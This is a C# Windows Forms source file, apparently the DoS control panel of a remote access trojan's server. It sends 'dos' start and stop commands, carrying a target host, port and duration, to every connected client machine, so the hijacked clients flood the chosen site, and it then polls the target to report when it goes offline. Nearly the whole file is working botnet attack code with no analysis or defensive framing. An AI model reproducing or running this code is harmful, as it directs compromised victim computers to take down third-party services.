using Server.MessagePack;
using Server.Connection;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace Server.Forms
{
    public partial class FormDOS : Form
    {
        private TimeSpan timespan;
        private Stopwatch stopwatch;
        private string status = "is online";
        public object sync = new object();
        public List<Clients> selectedClients = new List<Clients>();
        public List<Clients> PlguinClients = new List<Clients>();
        public FormDOS()
        {
            InitializeComponent();
        }

        private void BtnAttack_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtHost.Text) || string.IsNullOrWhiteSpace(txtPort.Text) || string.IsNullOrWhiteSpace(txtTimeout.Text)) return;

            try
            {
                if (!txtHost.Text.ToLower().StartsWith("http://")) txtHost.Text = "http://" + txtHost.Text;
                new Uri(txtHost.Text);
            }
            catch { return; }

            if (PlguinClients.Count > 0)
            {
                try
                {
                    btnAttack.Enabled = false;
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "dos";
                    msgpack.ForcePathObject("Option").AsString = "postStart";
                    msgpack.ForcePathObject("Host").AsString = txtHost.Text;
                    msgpack.ForcePathObject("Port").AsString = txtPort.Text;
                    msgpack.ForcePathObject("Timeout").AsString = txtTimeout.Text;

                    foreach (Clients clients in PlguinClients)
                    {
                        selectedClients.Add(clients);
                        ThreadPool.QueueUserWorkItem(clients.Send, msgpack.Encode2Bytes());
                    }

                    btnStop.Enabled = true;
                    timespan = TimeSpan.FromSeconds(Convert.ToInt32(txtTimeout.Text) * 60);
                    stopwatch = new Stopwatch();
                    stopwatch.Start();
                    timer1.Start();
                    timer2.Start();
                }
                catch { }
            }
        }

        private void BtnStop_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "dos";
                msgpack.ForcePathObject("Option").AsString = "postStop";

                foreach (Clients clients in PlguinClients)
                {
                    ThreadPool.QueueUserWorkItem(clients.Send, msgpack.Encode2Bytes());
                }
                selectedClients.Clear();
                btnAttack.Enabled = true;
                btnStop.Enabled = false;
                timer1.Stop();
                timer2.Stop();
                status = "is online";
            }
            catch { }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            this.Text = $"DOS ATTACK:{timespan.Subtract(TimeSpan.FromSeconds(stopwatch.Elapsed.Seconds))}    Status:host {status}";
            if (timespan < stopwatch.Elapsed)
            {
                btnAttack.Enabled = true;
                btnStop.Enabled = false;
                timer1.Stop();
                timer2.Stop();
                status = "is online";
            }
        }

        private void Timer2_Tick(object sender, EventArgs e)
        {
            try
            {
                WebRequest req = WebRequest.Create(new Uri(txtHost.Text));
                WebResponse res = req.GetResponse();
                res.Dispose();
                status = "is online";
            }
            catch
            {
                status = "is offline";
            }
        }

        private void FormDOS_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                foreach (Clients clients in PlguinClients)
                {
                    clients.Disconnected();
                }
                PlguinClients.Clear();
                selectedClients.Clear();
            }
            catch { }
            this.Hide();
            this.Parent = null;
            e.Cancel = true;
        }
    }
}
